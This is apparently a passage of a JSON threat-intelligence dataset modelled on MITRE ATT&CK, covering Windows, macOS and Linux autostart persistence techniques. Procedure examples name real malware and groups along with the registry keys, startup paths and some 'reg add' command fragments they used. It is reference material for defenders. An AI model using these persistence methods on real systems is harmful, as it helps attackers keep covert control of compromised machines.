HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce{random value name} = \"rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s \"{dropped copy path and file name}\"\"."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has the ability to modify a Registry Run key to establish persistence."}, {"id": "S0172", "name": "Reaver", "description": "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has established persistence by creating entries in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys."}, {"id": "S0332", "name": "Remcos", "description": "Remcos can add itself to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0375", "name": "Remexi", "description": "Remexi utilizes Run Registry keys in the HKLM hive as a persistence mechanism."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has created a new registry entry at HKEY_CURRENT_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Graphics with a value of C:\\ProgramData\\Initech\\Initech.exe /run."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP has been placed in the start up folder to trigger execution upon user login."}, {"id": "G0106", "name": "Rocke", "description": "Rocke's miner has created UPX-packed files in the Windows Start Menu Folder."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence."}, {"id": "S0090", "name": "Rover", "description": "Rover persists by creating a Registry entry in HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\."}, {"id": "S0148", "name": "RTM", "description": "RTM tries to add a Registry Run key under the name \"Windows Update\" to establish persistence."}, {"id": "G0048", "name": "RTM", "description": "RTM has used Registry run keys to establish persistence for the RTM Trojan and other tools, such as a modified version of TeamViewer remote desktop software."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT adds itself to the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence upon reboot."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used the Windows command line to create a Registry entry under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence."}, {"id": "S0085", "name": "S-Type", "description": "S-Type may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ IMJPMIJ8.1{3 characters of Unique Identifier}."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has established persistence by being copied to the Startup directory or through the \\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key."}, {"id": "S0074", "name": "Sakula", "description": "Most Sakula samples maintain persistence by setting the Registry Run key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ in the HKLM or HKCU hive, with the Registry value and file name varying by sample."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has the ability to add a value to the Registry Run key to establish persistence if it detects it is running with regular user privilege. "}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt creates a Registry entry to ensure infection after reboot under HKLM\\Software\\Microsoft\\Windows\\currentVersion\\Run."}, {"id": "S0382", "name": "ServHelper", "description": "ServHelper may attempt to establish persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ run key."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has the ability to create persistence for the malware using the Registry autorun key and startup folder."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has installed a registry based start-up key HKCU\\Software\\microsoft\\windows\\CurrentVersion\\Run to maintain persistence should other methods fail."}, {"id": "S0028", "name": "SHIPSHAPE", "description": "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has added paths to executables in the Registry to establish persistence."}, {"id": "G0091", "name": "Silence", "description": "Silence has used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, and the Startup folder to establish persistence."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can establish a LNK file in the startup folder for persistence."}, {"id": "S1035", "name": "Small Sieve", "description": "Small Sieve has the ability to add itself to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookMicrosift for persistence."}, {"id": "S0226", "name": "Smoke Loader", "description": "Smoke Loader adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has used reg.exe to create a Registry Run key."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 can create a VBS file in startup to persist after system restarts."}, {"id": "S0159", "name": "SNUGRIDE", "description": "SNUGRIDE establishes persistence through a Registry Run key."}, {"id": "S0035", "name": "SPACESHIP", "description": "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder."}, {"id": "S0058", "name": "SslMM", "description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE can establish persistence by installing itself in the startup folder, whereas the GO variant has created a HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\OutlookM registry key."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can use the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key for persistence."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot has been known to establish persistence by adding programs to the Run Registry key."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can use a Registry Run key to establish persistence."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has placed VBS files in the Startup folder and used Registry run keys to establish persistence for malicious payloads."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has modified the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run key for persistence."}, {"id": "S0586", "name": "TAINTEDSCRIBE", "description": "TAINTEDSCRIBE can copy itself into the current user\u2019s Startup folder as \"Narrator.exe\" for persistence."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has added batch scripts to the startup folder."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390's malware can add a Registry key to Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can be loaded into the Startup folder (%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrives.lnk) as a Shortcut file for persistence."}, {"id": "S0131", "name": "TINYTYPHON", "description": "TINYTYPHON installs itself under Registry Run key to establish persistence."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot can create a shortcut in the Windows startup folder for persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot establishes persistence in the Startup folder."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can create a link to itself in the Startup folder to automatically start itself upon system restart."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has created shortcuts in the Startup folder to establish persistence."}, {"id": "S0178", "name": "Truvasys", "description": "Truvasys adds a Registry Run key to establish persistence."}, {"id": "S0647", "name": "Turian", "description": "Turian can establish persistence by adding Registry Run keys."}, {"id": "G0010", "name": "Turla", "description": "A Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence."}, {"id": "S0199", "name": "TURNEDUP", "description": "TURNEDUP is capable of writing to a Registry Run key to establish."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used Registry Run keys to establish automatic execution at system startup."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer registers itself under a Registry Run key with the name \"USB Disk Security.\""}, {"id": "S0207", "name": "Vasport", "description": "Vasport copies itself to disk and creates an associated run key Registry entry to establish."}, {"id": "S0442", "name": "VBShower", "description": "VBShower used HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\[a-f0-9A-F]{8} to maintain persistence."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can add itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UIF2IS20VK Registry keys."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has created LNK files in the Startup folder to establish persistence."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can add a service named wind0ws to the Registry to achieve persistence after reboot."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has established persistence via the Registry key HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run and a shortcut within the startup folder."}, {"id": "S0341", "name": "Xbash", "description": "Xbash can create a Startup item for persistence if it determines it is on a Windows system."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy creates an entry in a Registry Run key for the malware to execute on startup."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda adds persistence by creating Registry Run keys."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has created a Registry Run key named Dropbox Update Setup to establish persistence for a malicious Python binary."}]}, {"name": "Authentication Package", "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.", "detailed_description": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of \"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.", "id": "T1547.002", "examples": [{"id": "S0143", "name": "Flame", "description": "Flame can use Windows Authentication Packages for persistence."}]}, {"name": "Time Providers", "description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.", "detailed_description": "Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.\nAdversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the DllName value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.", "id": "T1547.003", "examples": []}, {"name": "Winlogon Helper DLL", "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.", "detailed_description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software[\\Wow6432Node\\]\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon.\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse:\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.", "id": "T1547.004", "examples": [{"id": "S0534", "name": "Bazar", "description": "Bazar can use Winlogon Helper DLL to establish persistence."}, {"id": "S0351", "name": "Cannon", "description": "Cannon adds the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon to establish persistence."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has established persistence via the Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon registry key."}, {"id": "S0200", "name": "Dipsind", "description": "A Dipsind variant registers as a Winlogon Event Notify DLL to establish persistence."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by setting the value \"Shell\" with \"explorer.exe, %malware_pathfile%\" under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy issues the command reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" to achieve persistence. "}, {"id": "S0375", "name": "Remexi", "description": "Remexi achieves persistence using Userinit by adding the Registry key HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT creates a Registry key at HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell to survive a system reboot."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has created the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell and sets the value to establish persistence."}, {"id": "G0010", "name": "Turla", "description": "Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."}]}, {"name": "Security Support Provider", "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.", "detailed_description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.\nThe SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.", "id": "T1547.005", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can enumerate Security Support Providers (SSPs) as well as utilize PowerSploit's Install-SSP and Invoke-Mimikatz to install malicious SSPs and log authentication events."}, {"id": "S0002", "name": "Mimikatz", "description": "The Mimikatz credential dumper contains an implementation of an SSP."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Install-SSP Persistence module can be used to establish by installing a SSP DLL."}]}, {"name": "Kernel Modules and Extensions", "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.", "detailed_description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.\nWhen used maliciously, LKMs can be a type of kernel-mode Rootkit that run with the highest operating system privilege (Ring 0). Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through kextload and kextunload commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.\nAdversaries can use LKMs and kexts to conduct Persistence and/or Privilege Escalation on a system. Examples have been found in the wild, and there are some relevant open source projects as well.", "id": "T1547.006", "examples": [{"id": "S0502", "name": "Drovorub", "description": "Drovorub can use kernel modules to establish persistence."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, attackers used a signed kernel rootkit to establish additional persistence."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to install several loadable kernel modules (LKMs) on infected machines."}]}, {"name": "Re-opened Applications", "description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". When selected, all applications currently open are added to a property list file named com.apple.loginwindow.[UUID].plist within the ~/Library/Preferences/ByHost directory. Applications listed in this file are automatically reopened upon the user\u2019s next logon.", "detailed_description": "Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". When selected, all applications currently open are added to a property list file named com.apple.loginwindow.[UUID].plist within the ~/Library/Preferences/ByHost directory. Applications listed in this file are automatically reopened upon the user\u2019s next logon.\nAdversaries can establish Persistence by adding a malicious application path to the com.apple.loginwindow.[UUID].plist file to execute payloads when a user logs in.", "id": "T1547.007", "examples": []}, {"name": "LSASS Driver", "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.", "detailed_description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., Hijack Execution Flow), an adversary can use LSA operations to continuously execute malicious payloads.", "id": "T1547.008", "examples": [{"id": "S0208", "name": "Pasam", "description": "Pasam establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes."}]}, {"name": "Shortcut Modification", "description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.", "detailed_description": "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.", "id": "T1547.009", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has modified LNK shortcuts."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth's initial payload is a malicious .LNK file. "}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can establish persistence by writing shortcuts to the Windows Startup folder."}, {"id": "S0089", "name": "BlackEnergy", "description": "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder."}, {"id": "S0244", "name": "Comnie", "description": "Comnie establishes persistence via a .lnk file in the victim\u2019s startup path."}, {"id": "S0363", "name": "Empire", "description": "Empire can persist by modifying a .LNK file to include a backdoor."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT creates a .LNK file for persistence."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can write or modify browser shortcuts to enable launching of malicious browser extensions."}, {"id": "S0170", "name": "Helminth", "description": "Helminth establishes persistence by creating a shortcut."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use a .lnk shortcut for the Control Panel to establish persistence."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar adds a .lnk file to the Windows startup folder."}, {"id": "S0356", "name": "KONNI", "description": "A version of KONNI drops a Windows shortcut on the victim\u2019s machine to establish persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware has maintained persistence on a system by creating a LNK shortcut in the user\u2019s Startup folder."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can modify the shortcut that launches Telegram by replacing its path with the malicious payload to launch with the legitimate executable."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia creates a shortcut to maintain persistence."}, {"id": "S0439", "name": "Okrum", "description": "Okrum can establish persistence by creating a .lnk shortcut to itself in the Startup folder."}, {"id": "S0172", "name": "Reaver", "description": "Reaver creates a shortcut file and saves it in a Startup folder to establish persistence."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves attempts to add a shortcut file in the Startup folder to achieve persistence."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin establishes persistence by creating a shortcut (.LNK file) in the Windows startup folder to run a script each time the user logs in."}, {"id": "S0085", "name": "S-Type", "description": "S-Type may create the file %HOMEPATH%\\Start Menu\\Programs\\Startup\\Realtek {Unique Identifier}.lnk, which points to the malicious msdtc.exe file already created in the %CommonFiles% directory."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke is capable of persisting via a .lnk file stored in the Startup directory."}, {"id": "S0028", "name": "SHIPSHAPE", "description": "SHIPSHAPE achieves persistence by creating a shortcut in the Startup folder."}, {"id": "S0035", "name": "SPACESHIP", "description": "SPACESHIP achieves persistence by creating a shortcut in the current user's Startup folder."}, {"id": "S0058", "name": "SslMM", "description": "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an \"Office Start,\" \"Yahoo Talk,\" \"MSN Gaming Z0ne,\" or \"MSN Talk\" shortcut."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot can create a shortcut in the Windows startup folder for persistence."}]}, {"name": "Port Monitors", "description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. This DLL can be located in C:\\Windows\\System32 and will be loaded and run by the print spooler service, spoolsv.exe, under SYSTEM level permissions on boot.", "detailed_description": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup. This DLL can be located in C:\\Windows\\System32 and will be loaded and run by the print spooler service, spoolsv.exe, under SYSTEM level permissions on boot.\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the Driver value of an existing or new arbitrarily named subkey of HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors. The Registry key contains entries for the following:", "id": "T1547.010", "examples": []}, {"name": "Print Processors", "description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.", "detailed_description": "Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot.\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the AddPrintProcessor API call with an account that has SeLoadDriverPrivilege enabled. Alternatively, a print processor can be registered to the print spooler service by adding the HKLM\\SYSTEM\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\[Windows architecture: e.g., Windows x64]\\Print Processors\\[user defined]\\Driver Registry key that points to the DLL.\nFor the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the GetPrintProcessorDirectory API call, or referenced via a relative path from this directory. After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.\nThe print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.", "id": "T1547.012", "examples": [{"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has added the Registry key HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\UDPrint\" /v Driver /d \"spool.dll /f to load malware as a Print Processor."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can drop itself in C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll to be loaded automatically by the spoolsv Windows service."}, {"id": "S0501", "name": "PipeMon", "description": "The PipeMon installer has modified the Registry key HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors to install PipeMon as a Print Processor."}]}, {"name": "XDG Autostart Entries", "description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (.desktop) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.", "detailed_description": "Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user\u2019s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (.desktop) to configure the user\u2019s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.\nAdversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the Exec directive in the .desktop configuration file. When the user\u2019s desktop environment is loaded at user login, the .desktop files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the /etc/xdg/autostart directory while the user entries are located in the ~/.config/autostart directory.\nAdversaries may combine this technique with Masquerading to blend malicious Autostart entries with legitimate programs.", "id": "T1547.013", "examples": [{"id": "S0235", "name": "CrossRAT", "description": "CrossRAT can use an XDG Autostart to establish persistence."}, {"id": "S0410", "name": "Fysbis", "description": "If executing without root privileges, Fysbis adds a .desktop configuration file to the user's ~/.config/autostart directory."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can use XDG Autostart Entries to establish persistence on Linux systems."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use an XDG Autostart to establish persistence."}, {"id": "S1078", "name": "RotaJakiro", "description": "When executing with user-level permissions, RotaJakiro can install persistence using a .desktop file under the $HOME/.config/autostart/ folder."}]}, {"name": "Active Setup", "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.", "detailed_description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer. These programs will be executed under the context of the user and will have the account's associated permissions level.\nAdversaries may abuse Active Setup by creating a key under  HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\ and setting a malicious value for StubPath. This value will serve as the program that will be executed when a user logs into the computer.\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.", "id": "T1547.014", "examples": [{"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a Registry key in the Active Setup pointing to a malicious executable."}]}, {"name": "Login Items", "description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or Service Management Framework. Shared file list login items can be set using scripting languages such as AppleScript, whereas the Service Management Framework uses the API call SMLoginItemSetEnabled.", "detailed_description": "Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or Service Management Framework. Shared file list login items can be set using scripting languages such as AppleScript, 